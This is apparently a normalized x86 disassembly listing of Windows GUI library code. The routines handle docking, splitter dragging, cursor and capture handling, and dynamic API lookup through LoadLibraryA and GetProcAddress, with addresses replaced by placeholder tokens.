mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44822c
pop ecx
sub_4482e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448421
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4483d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_443194
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4483d7
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4481b4
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4431a8
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_4483d7
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44822c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448428
lea eax [ ebp - 0x14 ]
call sub_403fbc
retn
sub_448430
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446b80
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446ba8
call sub_448430
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446b80
call sub_448430
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_4465b0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_446aa8
mov edx eax
mov eax ebx
call sub_446ad0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_446ad0
jmp r-xdata
sub_4484b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_448430
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4484fc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_446aa8
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_446ad0
sub_44852c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4446f8
mov edx eax
mov eax [ rw-data ]
call sub_44908c
mov eax [ ebx + 0x14 ]
call sub_4446f8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_448640
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44858c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44908c
mov eax ebx
call sub_448640
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_446ad0
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_446ad0
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4484b8
push ebx
push sub_448630
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_446e5c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_448608
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_443194
test eax eax
jle r-xdata
push ebx
push sub_448630
xor edx edx
mov eax ebx
call sub_446e5c
sub_448640
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_446674
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_446674
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4466e0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4466e0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41ce94
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44872c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44872c
pop ecx
mov eax ebx
call sub_446aa8
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446aa8
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44872c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_446aa8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_423878
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_4487bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446aa8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44662c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_446aa8
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44872c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44880c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43d864
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d864
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_448888
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446538
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4465e4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_446b8c
test eax eax
je r-xdata
mov eax esi
call sub_4465b0
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_448630
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_446e5c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446b8c
mov edx [ ebx + 0x20 ]
call sub_446ae4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_448888
pop ecx
sub_448908
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_446594
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_446594
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_446b8c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_448908
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_448630
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_446e5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_446790
mov eax edi
call sub_446b80
test eax eax
je r-xdata
mov eax edi
call sub_446b8c
mov esi eax
mov eax esi
call sub_446aa8
push eax
mov eax esi
call sub_4465e4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_446b80
call sub_446aa8
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_446aa8
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_446ad0
mov eax esi
call sub_446aa8
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_446ad0
mov eax edi
call sub_446b8c
call sub_446b20
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4465e4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_446ad0
mov eax edi
call sub_446b80
call sub_446b20
mov bl 0x1
jmp r-xdata
sub_448a40
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446df4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41256c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4475e8
test eax eax
je r-xdata
push ebp
call sub_448888
pop ecx
push ebp
call sub_448908
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44880c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_448ac8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_446674
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_446674
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4487bc
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4487bc
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_448b58
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448f30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406980
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4475e8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44858c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406980
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4475e8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43da08
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f37
lea eax [ ebp - 0x48 ]
call sub_403fbc
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4446f8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43c724
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43ec10
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fbc
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_448a40
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443228
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_448640
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406980
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_448ac8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_448640
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406980
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4475e8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43dde4
jmp r-xdata
mov eax edi
call sub_45b210
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4475e8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d864
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43dec4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404010
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44852c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c910
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4446f8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43e584
jmp r-xdata
sub_448f40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403590
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_4490b4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_448fd0
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44908c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_449034
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_449064
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406a74
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44908c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449000
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_4490b4
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_449018
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_449034
pop ebx
retn
mov eax ebx
call sub_449064
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_449118
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44927e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44939c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_449380
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_449380
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44948c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40326c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40326c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
